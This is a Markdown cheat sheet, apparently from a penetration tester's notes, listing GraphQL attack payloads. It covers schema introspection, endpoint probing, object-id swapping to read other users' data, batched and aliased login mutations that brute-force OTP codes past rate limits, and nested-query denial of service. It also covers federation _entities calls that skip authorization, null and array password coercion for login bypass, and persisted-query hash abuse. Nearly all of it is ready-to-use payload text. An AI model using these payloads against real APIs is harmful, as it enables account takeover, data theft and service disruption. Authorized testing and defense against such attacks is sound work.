---
title: "Payloads: GraphQL"
type: payloads
tags: [payloads, graphql, api, web]
sources: []
date_created: 2026-06-05
date_updated: 2026-11-09
---

# Payloads: GraphQL

Enumerate schema, then abuse. See [[api-security]].

## Introspection (full schema)
```graphql
{__schema{types{name fields{name args{name type{name}}}}}}
{__schema{queryType{name} mutationType{name} types{name kind}}}
```
If disabled: field-suggestion brute (error messages leak names), or use clairvoyance.

## Recon probes
```
{__typename}
query={__schema{types{name}}}        # also try GET ?query=
POST /graphql {"query":"..."}        # try /graphql /api/graphql /v1/graphql /graphiql
```

## Abuse
```
# IDOR / BOLA - swap object ids in queries
{ user(id:"<other>"){ email role } }
# Batching (bypass rate-limit / brute MFA)
[{"query":"mutation{login(otp:\"0000\")}"},{"query":"mutation{login(otp:\"0001\")}"}, ...]
# Alias overloading (amplify / brute in one request)
{ a:login(otp:"0000"){ok} b:login(otp:"0001"){ok} ... }
# Nested DoS
{ a{ b{ a{ b{ ... }}}} }
# Mutation enum -> find hidden privileged ops
```

## Auth issues
```
introspection in prod · queries without auth · mutation accessible pre-auth · JWT in WS connection_init
```

## NEW 2025-2026

```graphql
# Federation _entities direct hit (skips root-query authz):
{ _service { _sdl } }                        # leak the federated SDL, get __typename values
{ _entities(representations: [{typename: "TargetType", id: "<other-user-id>"}]) {
    ... on TargetType { email role secrets } } }
# resolver runs WITHOUT walking from a root query -> field-level authz at the
# root never fires; swap typename/id like any BOLA primitive.

# Sign-in type coercion (login mutation):
mutation { login(user: "victim", password: null) { token } }
mutation { login(user: "victim", password: ["real-pass"]) { token } }
# sloppy resolvers treat coerced null / first-array-element as a valid check.

# APQ (automatic persisted query) control asymmetry:
GET /graphql?extensions={"persistedQuery":{"sha256Hash":"<hash>","version":1}}
# register a hash with one query text, then request it expecting another;
# hash/query mismatch acceptance = replay any op under a trusted hash.
```

Batching + aliases still beat rate limits; cost analyzers misprice aliased
fragments. Field-suggestion errors (`Did you mean ...`) leak names when
introspection is off - brute with clairvoyance. See [[api-security]].
